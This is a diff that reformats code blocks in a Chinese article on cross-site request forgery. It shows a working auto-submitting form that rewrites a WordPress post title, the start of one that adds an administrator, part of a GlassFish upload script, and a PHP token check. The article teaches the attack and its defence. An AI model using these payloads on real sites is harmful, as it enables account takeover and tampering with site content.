@@ -41,44 +41,44 @@ CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制
 
 那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，核心的 Exploit 代码为 :
 
-```
+```html
  <html>
- <body onload="javascript:document.forms[0].submit()">
- <H2>CSRF Exploit to change post title</H2>
- <form method="POST" name="form0" action="http://<wordpress_ip>:80/wp-admin/admin-ajax.php">
- <input type="hidden" name="post_title" value="hackedtitle"/>
- <input type="hidden" name="post_name" value="hackedtitle"/>
- <input type="hidden" name="mm" value="03"/>
- <input type="hidden" name="jj" value="16"/>
- <input type="hidden" name="aa" value="2012"/>
- <input type="hidden" name="hh" value=""/>
- <input type="hidden" name="mn" value=""/>
- <input type="hidden" name="ss" value=""/>
- <input type="hidden" name="post_author" value="1"/>
- <input type="hidden" name="post_password" value=""/>
- <input type="hidden" name="post_category%5B%5D" value="0"/>
- <input type="hidden" name="post_category%5B%5D" value="1"/>
- <input type="hidden" name="tax_input%5Bpost_tag%5D" value=""/>
- <input type="hidden" name="comment_status" value="open"/>
- <input type="hidden" name="ping_status" value="open"/>
- <input type="hidden" name="_status" value="publish"/>
- <input type="hidden" name="post_format" value="0"/>
- <input type="hidden" name="_inline_edit" value="<sniffed_value>"/>
- <input type="hidden" name="post_view" value="list"/>
- <input type="hidden" name="screen" value="edit-post"/>
- <input type="hidden" name="action" value="inline-save"/>
- <input type="hidden" name="post_type" value="post"/>
- <input type="hidden" name="post_ID" value="1"/>
- <input type="hidden" name="edit_date" value="true"/>
- <input type="hidden" name="post_status" value="all"/>
- </form>
- </body>
+  <body onload="javascript:document.forms[0].submit()">
+    <h2>CSRF Exploit to change post title</h2>
+    <form method="POST" name="form0" action="http://<wordpress_ip>:80/wp-admin/admin-ajax.php">
+      <input type="hidden" name="post_title" value="hackedtitle"/>
+      <input type="hidden" name="post_name" value="hackedtitle"/>
+      <input type="hidden" name="mm" value="03"/>
+      <input type="hidden" name="jj" value="16"/>
+      <input type="hidden" name="aa" value="2012"/>
+      <input type="hidden" name="hh" value=""/>
+      <input type="hidden" name="mn" value=""/>
+      <input type="hidden" name="ss" value=""/>
+      <input type="hidden" name="post_author" value="1"/>
+      <input type="hidden" name="post_password" value=""/>
+      <input type="hidden" name="post_category%5B%5D" value="0"/>
+      <input type="hidden" name="post_category%5B%5D" value="1"/>
+      <input type="hidden" name="tax_input%5Bpost_tag%5D" value=""/>
+      <input type="hidden" name="comment_status" value="open"/>
+      <input type="hidden" name="ping_status" value="open"/>
+      <input type="hidden" name="_status" value="publish"/>
+      <input type="hidden" name="post_format" value="0"/>
+      <input type="hidden" name="_inline_edit" value="<sniffed_value>"/>
+      <input type="hidden" name="post_view" value="list"/>
+      <input type="hidden" name="screen" value="edit-post"/>
+      <input type="hidden" name="action" value="inline-save"/>
+      <input type="hidden" name="post_type" value="post"/>
+      <input type="hidden" name="post_ID" value="1"/>
+      <input type="hidden" name="edit_date" value="true"/>
+      <input type="hidden" name="post_status" value="all"/>
+    </form>
+  </body>
  </html>
 ```
 
 另一个测试用例时添加某个具有管理员权限的用户，测试用例为 :
 
-```
+```html
  <html>
  <body onload="javascript:document.forms[0].submit()">
  <H2>CSRF Exploit to add Administrator</H2>
@@ -110,7 +110,7 @@ CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制
 
 然后添加如下脚本 :
 
-```
+```js
 var logUrl = 'http://glassfishserver/management/domain/applications/application';
 
 function fileUpload(fileData, fileName) {
@@ -281,7 +281,7 @@ function start() {
 
 然后在服务器端进行 Hash 值验证：
 
-```
+```php
       <?php
 　　      if(isset($_POST['check'])) {
      　　      $hash = md5($_COOKIE['cookie']);
